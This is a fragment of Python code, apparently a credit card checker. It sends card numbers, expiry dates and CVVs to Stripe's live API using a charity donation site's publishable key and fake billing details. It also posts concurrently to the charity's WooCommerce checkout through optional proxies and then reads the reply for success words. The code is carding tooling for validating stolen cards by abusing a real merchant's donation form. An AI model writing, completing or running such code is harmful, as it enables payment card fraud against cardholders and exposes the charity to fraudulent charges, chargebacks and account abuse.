...
def make_stripe_request(card_number, exp_m, exp_y, cvv, proxy):
    headers1 = {
    ...
    data1 = f'billing_details[name]=Zbi+Oeiror&billing_details[email]=111vxh0jcg%40osxofulk.com&billing_details[phone]=01289160633&billing_details[address][city]=Oeheorhrp&billing_details[address][country]=IE&billing_details[address][line1]=Pehdpd&billing_details[address][line2]=O3heuorrh&billing_details[address][postal_code]=A91+V06A&billing_details[address][state]=LH&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_y}&card[exp_month]={exp_m}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F846ec90400%3B+stripe-js-v3%2F846ec90400%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbreastcancerresearch.ie&time_on_page=346512&client_attribution_metadata[client_session_id]=8b6f4c0f-63d0-4960-ab52-c3d7cc733418&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=4820cb57-68f3-426a-9b05-aec004d78c83&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=payment&guid=72aab036-b548-48d8-af10-4ff370ed9f9bb09e72&muid=48424225-45fc-473a-b00a-a179ffe75cecdeab4f&sid=02897b14-9843-4e07-9f03-ac8f1e7fe3341a6614&key=pk_live_51J4kFAFS97fwg3KK41P8OfGLA3H3nGJSEA8IGfa9EzcXRq3C7yLeZK77YWoy1vGTYnL6au52TrkH4sxkX6x3HIw800x4RXaHkv&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..c8BbM5uhnj4j9KcaD1E0usj09g2i_LAedkREhERNEpM'

    if proxy:
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, proxies=proxy, timeout=30)
    else:
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=30)
    
    return response1.json()

def make_wc_request(proxy):
    cookies = {
    ...
    if proxy:
        response2 = requests.post('https://breastcancerresearch.ie/', params=params, cookies=cookies, headers=headers2, data=data2, proxies=proxy, timeout=30)
    else:
        response2 = requests.post('https://breastcancerresearch.ie/', params=params, cookies=cookies, headers=headers2, data=data2, timeout=30)
...
def check_card(card_data):
    ...
    try:
        ...
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            stripe_future = executor.submit(make_stripe_request, card_number, exp_m, exp_y, cvv, proxy)
            wc_future = executor.submit(make_wc_request, proxy)
            
            stripe_response = stripe_future.result()
            wc_response = wc_future.result()
        
        result_text = str(wc_response.get('result', ''))
        
        success_keywords = ['success', 'successfully']
